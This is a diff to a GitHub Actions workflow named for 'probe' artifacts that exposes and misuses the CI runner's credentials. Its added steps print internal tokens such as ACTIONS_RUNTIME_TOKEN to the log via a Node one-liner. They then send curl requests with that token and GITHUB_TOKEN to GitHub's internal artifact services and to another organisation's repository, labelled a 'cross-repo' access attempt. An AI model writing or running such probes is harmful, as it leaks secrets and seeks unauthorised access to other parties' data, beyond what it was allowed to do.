@@ -4,28 +4,56 @@ jobs:
   upload:
     runs-on: ubuntu-latest
     steps:
-      - name: Create test artifact
-        run: |
-          mkdir -p /tmp/artifact-data
-          echo "test-artifact-content-$(date +%s)" > /tmp/artifact-data/data.txt
-          cat /tmp/artifact-data/data.txt
-      - name: Upload artifact
+      - name: Upload artifact to populate env vars
         uses: actions/upload-artifact@v4
         with:
-          name: probe-artifact
-          path: /tmp/artifact-data/
-      - name: Print env vars now populated by upload-artifact
+          name: probe-artifact-2
+          path: /etc/hostname
+      
+      - name: Extract env vars via Node.js (may have different env from bash)
         run: |
-          echo "ACTIONS_RUNTIME_TOKEN (first 30 chars): ${ACTIONS_RUNTIME_TOKEN:0:30}..."
-          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
-          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
-          echo "RUNNER_ENVIRONMENT: $RUNNER_ENVIRONMENT"
-          # Try to use the runtime token to probe cache across repos
-          if [ -n "$ACTIONS_RESULTS_URL" ]; then
-            echo "=== Probe artifact API ==="
-            # Try listing ALL artifacts (cross-repo attempt)
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              -H "Accept: application/json;api-version=6.0-preview" \
-              "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-              -d '{}' | head -200
-          fi
+          node -e "
+          const env = process.env;
+          const keys = ['ACTIONS_RESULTS_URL','ACTIONS_RUNTIME_TOKEN','ACTIONS_CACHE_URL','ACTIONS_ID_TOKEN_REQUEST_URL'];
+          keys.forEach(k => {
+            const v = env[k];
+            if (v) console.log(k + ': ' + v.substring(0, 80));
+            else console.log(k + ': (empty)');
+          });
+          // Also print any env vars with 'action' in the key
+          Object.keys(env).filter(k => k.toLowerCase().includes('action')).forEach(k => {
+            const v = env[k];
+            if (v && !v.includes('***')) console.log('FOUND: ' + k + '=' + v.substring(0,80));
+          });
+          "
+
+      - name: Probe artifact service if URL found
+        run: |
+          # Try known artifact service URLs directly with the runtime token
+          # Even if ACTIONS_RESULTS_URL is not in env, try known patterns
+          
+          # Pattern 1: pipelines.actions.githubusercontent.com
+          echo "=== Probe pipelines service ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview" \
+            "https://pipelines.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -d '{}' -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
+          
+          # Pattern 2: results-receiver.actions.githubusercontent.com
+          echo "=== Probe results-receiver ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -d '{}' -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
+          
+          # Pattern 3: Try via GITHUB_API_URL with workflow token 
+          echo "=== Probe GitHub API with workflow token (should be limited to this repo) ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts" \
+            -w "\nHTTP: %{http_code}" 2>/dev/null | head -20
+          
+          # Pattern 4: Try cross-repo artifact access with the GITHUB_TOKEN
+          echo "=== Cross-repo artifact probe with GITHUB_TOKEN ==="
+          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://api.github.com/repos/github/docs/actions/artifacts" \
+            -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
